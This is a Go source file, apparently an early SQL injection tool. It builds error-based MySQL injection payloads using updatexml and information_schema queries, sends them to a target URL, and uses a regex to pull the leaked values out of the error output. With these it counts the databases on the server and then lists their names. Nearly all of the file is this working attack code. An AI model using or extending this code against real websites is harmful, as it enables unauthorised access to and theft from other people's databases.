package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strconv"
	"strings"
)

type url []string

var data []string

//string to slice
func string_to_slice(u string) url {
	making_slice := strings.Fields(u)
	return url(making_slice)
}

//regex
func regex(content string) string {
	re2 := regexp.MustCompile(`~\s*(.*?)\s*~`)
	matches := re2.FindAllStringSubmatch(content, -1)
	for _, v := range matches {
		return v[1]
	}

	// result := re2.FindString(content)
	// return result
	return "----------------------------------------------"
}

//getting url body
//func get_body(v string, c chan string) string {
func get_body(v string, c chan string) string {

	resp, err := http.Get(v)
	if err != nil {
		fmt.Println(err)
		//c <- "err"

	}
	//We Read the response body on the line below.
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		//c <- "err"
	}
	//Convert the body to type string
	sb := string(body)
	ab := regex(sb)
	//fmt.Println(ab)
	//sb_to_slice := strings.Fields(ab)
	//c <- ""
	// sending ab value in c
	c <- ab
	return ab
}

// body
func get_body_int(v string, c chan int) int {

	resp, err := http.Get(v)
	if err != nil {
		fmt.Println(err)

	}
	//We Read the response body on the line below.
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)

	}
	//Convert the body to type string
	sb := string(body)
	ab := regex(sb)
	//fmt.Println(ab)
	//sb_to_slice := strings.Fields(ab)

	intVar, _ := strconv.Atoi(ab)
	// sending intVar in c value
	c <- intVar

	return intVar
}

//counting database in int
func count_database(u string) int {
	query := "+and+updatexml(null,concat(0x7e,(select%20count(schema_name)%20from%20information_schema.schemata),0x7e),null)--+-"
	//slice_query := string_to_slice(query)
	database := u + query
	c := make(chan int)
	go get_body_int(database, c)
	//assigning reciever c data in msg
	msg := <-c

	return msg
}

//fetching database
func database_payload(d string, no int) string {
	//var s []string
	fmt.Println("******************DATABASES*******************")
	for i := 0; i <= no; i++ {
		str := strconv.Itoa(i)
		database_query := "+and+updatexml(null,concat(0x7e,(select%20schema_name%20from%20information_schema.schemata+limit+"
		second_query := ",1),0x7e),null)--+-"
		database_fetch := d + database_query + str + second_query
		c := make(chan string)

		go get_body(database_fetch, c)
		//reciever c assigning in msg
		msg := <-c
		fmt.Println(msg)
		//b := append(s, database_body)
		//fmt.Println(database_body)

	}
	//fmt.Println(s)

	return "DONE :)"
}
